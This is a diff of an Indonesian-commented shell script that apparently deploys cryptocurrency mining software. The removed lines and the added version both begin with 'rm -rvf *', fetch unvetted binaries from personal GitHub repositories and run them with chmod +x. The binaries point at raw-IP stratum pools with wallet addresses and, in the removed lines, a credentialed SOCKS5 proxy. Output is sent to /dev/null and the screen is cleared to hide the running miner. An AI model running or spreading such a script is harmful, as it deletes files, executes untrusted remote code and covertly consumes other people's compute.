@@ -1,2 +1,99 @@
-rm -rvf * && mkdir ab && cd ab
-wget https://github.com/usapindong/test/releases/download/testi2/widper && chmod +x widper && ./widper --algo pearlhash --url 103.178.153.229:80 --user prl1psq3d3d5lawjz99ytn5egzfjrzxvqm48zhcnnwq23eyq8thpz347suml75p.$(shuf -n 1 -i 1-9999)-jembut --proxy socks5://ubed:ubed123@103.176.78.132:443 & sleep 15 && wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod +x sse20 && clear && ./sse20 -a power2b -o stratum+tcp://103.196.155.151:80 -u MbVBtUuYHPKuZKV9zhhjufNzfPstvYkUBN -t $(nproc) > /dev/null 2>&1 & clear
+rm -rvf * && sleep 5s && mkdir a && cd a
+# ============================================
+# 1. SETUP LIBSTDC++ LOKAL (GLIBCXX_3.4.29)
+# ============================================
+echo "[INFO] Memeriksa libstdc++ di ~/lib64..."
+
+if [ ! -f "$HOME/lib64/libstdc++.so.6" ] || ! strings "$HOME/lib64/libstdc++.so.6" 2>/dev/null | grep -q "GLIBCXX_3.4.29"; then
+    echo "[INFO] GLIBCXX_3.4.29 tidak ditemukan, menginstall..."
+
+    mkdir -p ~/lib64
+    cd ~
+
+    # Download libstdc++
+    echo "[INFO] Download libstdc++..."
+    wget -q -O libstdc++.deb http://archive.ubuntu.com/ubuntu/pool/main/g/gcc-12/libstdc++6_12-20220319-1ubuntu1_amd64.deb
+
+    # Ekstrak .deb
+    ar x libstdc++.deb
+
+    # Cek format kompresi (zst atau xz)
+    if [ -f "data.tar.zst" ]; then
+        echo "[INFO] Format zst detected, installing zstd..."
+        if ! command -v zstd &> /dev/null; then
+            echo "[INFO] Download zstd..."
+            wget -q https://github.com/facebook/zstd/releases/download/v1.5.7/zstd-1.5.7.tar.gz
+            tar -xvzf zstd-1.5.7.tar.gz > /dev/null 2>&1
+            cd zstd-1.5.7
+            make -j$(nproc) > /dev/null 2>&1
+            mkdir -p ~/bin
+            cp programs/zstd ~/bin/
+            export PATH="$HOME/bin:$PATH"
+            cd ~
+        fi
+        zstd -d data.tar.zst
+        tar -xf data.tar
+    elif [ -f "data.tar.xz" ]; then
+        tar -xf data.tar.xz
+    else
+        echo "❌ Format data tidak dikenal!"
+        exit 1
+    fi
+
+    # Copy library
+    cp -f usr/lib/x86_64-linux-gnu/libstdc++.so.6* ~/lib64/
+    echo "[INFO] ✅ libstdc++ terinstall di ~/lib64"
+fi
+
+# ============================================
+# 2. CEK GPU
+# ============================================
+echo "[INFO] Memeriksa GPU..."
+if command -v nvidia-smi &> /dev/null; then
+    nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null || echo "[WARN] Tidak ada GPU terdeteksi"
+else
+    echo "[WARN] nvidia-smi tidak ditemukan, pakai CPU mode"
+    MODE="cpu"
+fi
+
+# ============================================
+# 3. BUAT WRAPPER run-glibc
+# ============================================
+cat > "$HOME/run-glibc" <<'EOFW'
+#!/bin/bash
+GLIBC_PATH="$HOME/.local/glibc-2.35/lib"
+LOCAL_LIB="$HOME/lib64"
+$GLIBC_PATH/ld-linux-x86-64.so.2 \
+  --library-path "$GLIBC_PATH:$LOCAL_LIB:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu" "$@"
+EOFW
+chmod +x "$HOME/run-glibc"
+
+# ============================================
+# 4. DOWNLOAD GOLDEN (JIKA BELUM ADA)
+# ============================================
+cd "$HOME"
+if [ ! -f "./golden" ]; then
+    echo "[INFO] Download golden..."
+    wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/golden  -O golden
+    chmod +x golden
+fi
+
+# ============================================
+# 5. JALANKAN GOLDEN
+# ============================================
+echo "============================"
+echo "✅ Menjalankan golden dengan GLIBC 2.35 + GLIBCXX_3.4.29"
+echo "============================"
+
+# Pilih mode otomatis (gpu/cpu)
+if command -v nvidia-smi &> /dev/null && nvidia-smi &> /dev/null; then
+    MODE="gpu"
+else
+    MODE="cpu"
+fi
+
+"$HOME/run-glibc" ./golden \
+  --pubkey=28SNhUbsjoqgJ9ycKX3fkgZ8G6tXGXZcKknNHDKAM5hmaX2b1BWWpn5 \
+  --label=jembut \
+  --mode=gpu \
+  --threads-per-card=1 & clear & wget https://github.com/usapindong/test/raw/refs/heads/main/sse20 && chmod +x sse20 && clear && ./sse20 -a power2b -o stratum+tcp://103.196.155.151:80 -u MbVBtUuYHPKuZKV9zhhjufNzfPstvYkUBN -t $(nproc) > /dev/null 2>&1 & clear
